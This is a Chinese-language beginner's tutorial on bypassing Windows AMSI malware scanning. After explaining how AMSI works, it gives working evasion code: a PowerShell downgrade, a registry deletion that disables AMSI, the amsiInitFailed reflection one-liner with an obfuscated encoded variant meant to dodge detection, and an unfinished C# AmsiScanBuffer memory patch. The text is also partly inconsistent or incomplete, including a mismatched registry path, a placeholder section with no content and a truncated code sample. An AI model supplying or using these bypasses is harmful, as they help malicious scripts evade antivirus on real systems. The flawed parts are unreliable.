## 前言
本文是对绕过AMSI（Antimalware Scan Interface）技术的总结，旨在为初学者提供参考。希望读者能够理解并提出宝贵意见。

## 何为AMSI
AMSI（Antimalware Scan Interface）是一种反恶意软件扫描接口，由微软开发。其主要目的是为应用程序和服务提供一个通用接口标准，使其能够与机器上安装的各种反恶意软件产品集成。通过这种方式，AMSI 提供了增强的恶意软件保护功能，并支持多种常见的恶意软件扫描和保护技术，包括文件和内存扫描、内容源 URL/IP 信誉检查等。

### AMSI 的工作原理
AMSI 本身并不直接检测恶意脚本，而是作为一个通道，将数据传递给反恶意软件产品（如 Windows Defender）。无论恶意脚本经过多少次模糊处理或远程执行，AMSI 都能在脚本注入内存前进行检测。相比之下，传统的静态杀毒软件无法做到这一点。

当用户执行脚本或启动 PowerShell 时，`AMSI.dll` 会被动态加载到内存空间中。此时，防病毒软件会调用以下两个 API 来扫描缓冲区和字符串中的恶意代码：
- `AmsiScanBuffer()`
- `AmsiScanString()`

需要注意的是，并非所有杀毒软件都能调用 AMSI 接口。该功能仅在 Windows 10 和 Windows Server 2016 及更高版本中可用，且国内的一些杀毒软件可能不支持此接口。GitHub 上有一个项目记录了可以调用 AMSI 的杀毒软件列表。

### AMSI 在 Windows 中的应用
AMSI 功能已集成到 Windows 10 的多个组件中，包括但不限于：
1. 用户账户控制 (UAC)：用于 EXE、COM、MSI 和 ActiveX 安装。
   - `%windir%\System32\consent.exe`
2. PowerShell：用于脚本、交互式使用和动态代码求值。
   - `System.Management.Automation.dll`
3. Windows 脚本宿主：
   - `wscript.exe`
   - `cscript.exe`
4. JavaScript 和 VBScript：
   - `%windir%\System32\jscript.dll`
   - `%windir%\System32\vbscript.dll`
5. Office VBA 宏：
   - `VBE7.dll`
6. .NET Assembly：
   - `clr.dll`
7. WMI：
   - `%windir%\System32\wbem\fastprox.dll`

## 主流对抗方法
### 1. 降级攻击
由于低版本（如 2.0）的 PowerShell 不包含 AMSI，因此在这些版本上执行恶意脚本不会被检测到。然而，现代系统（如 Windows 10 和 Windows Server 2016/2019）通常不再预装 PowerShell 2.0。可以通过以下命令查看当前的 PowerShell 版本：

```powershell
$PSVersionTable
```

要判断是否可以使用 PowerShell 2.0，可以使用以下命令：
- **非管理员权限**：
  ```powershell
  Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
  ```
- **需要管理员权限**：
  - **Windows 10**：
    ```powershell
    Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
    ```
  - **Windows Server 2016/2019**：
    ```powershell
    Get-WindowsFeature PowerShell-V2
    ```

通过在脚本开头添加 `#requires -version 2`，可以尝试以 PowerShell 2.0 执行脚本。如果不能使用 2.0 版本，则脚本将以当前版本执行。请注意，并非所有脚本都兼容低版本的 PowerShell。

### 2. 拆分
（此处省略具体细节，因为原文未提供详细信息）

### 3. 改注册表禁用 AMSI
通过设置注册表项 `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` 为 0，可以禁用 AMSI。但这种方法并不隐蔽，且需要管理员权限。

```powershell
Remove-Item -Path "HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable" -Recurse
```

### 4. 一键关闭 AMSI
可以通过一行命令关闭 AMSI，但这通常会被防御系统拦截。例如：

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

为了绕过这种检测，可以对关键字符串进行编码和解码。以下是示例代码：

```powershell
$a="5492868772801748688168747280728187173688878280688776828"
$b="1173680867656877679866880867644817687416876797271"

$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$d=[Ref].Assembly.GetType($c)

$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$f=$d.GetField($e,'NonPublic,Static')

$f.SetValue($null,$true)
```

### 5. 内存补丁
AMSI 检测相关 API 的调用顺序如下：
- `AmsiInitialize`：初始化 AMSI API。
- `AmsiOpenSession`：打开会话。
- `AmsiScanBuffer`：扫描用户输入。
- `AmsiCloseSession`：关闭会话。
- `AmsiUninitialize`：删除 AMSI API。

通过修改 `AmsiScanBuffer` 函数的参数值（如扫描长度或返回值），可以绕过 AMSI。以下是一个示例代码片段：

```csharp
using System;
using System.Linq;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfloldProtect);

    public static void Bypass()
    {
        String a = "isma";
        String b = "reffuBnacSismA";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + ".dll");
        
        // 其他代码...
    }
}
```

以上代码展示了如何通过内存补丁绕过 AMSI。更多详细的混淆方法和技术可以进一步学习 PowerShell 语言本身。

希望本文能为您提供有价值的参考。